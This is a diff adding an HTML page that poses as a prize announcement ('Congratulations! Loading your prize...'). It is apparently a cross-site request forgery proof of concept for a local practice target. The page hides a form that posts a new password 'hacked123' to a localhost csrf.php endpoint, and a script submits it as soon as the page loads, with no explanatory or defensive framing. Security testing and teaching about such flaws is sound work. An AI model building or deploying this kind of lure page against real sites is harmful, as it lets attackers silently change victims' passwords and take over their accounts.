@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>You Won a Prize!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+        }
+        .loading {
+            font-size: 1.5em;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 Congratulations! 🎉</h1>
+    <p class="loading">Loading your prize...</p>
+    
+    <!-- Hidden form that auto-submits to change password -->
+    <form id="csrf_form" action="http://localhost:8000/csrf.php" method="POST" style="display:none;">
+        <input type="hidden" name="new_password" value="hacked123">
+        <input type="hidden" name="confirm_password" value="hacked123">
+    </form>
+    
+    <script>
+        // Auto-submit form saat halaman dimuat
+        document.getElementById('csrf_form').submit();
+    </script>
+</body>
+</html>
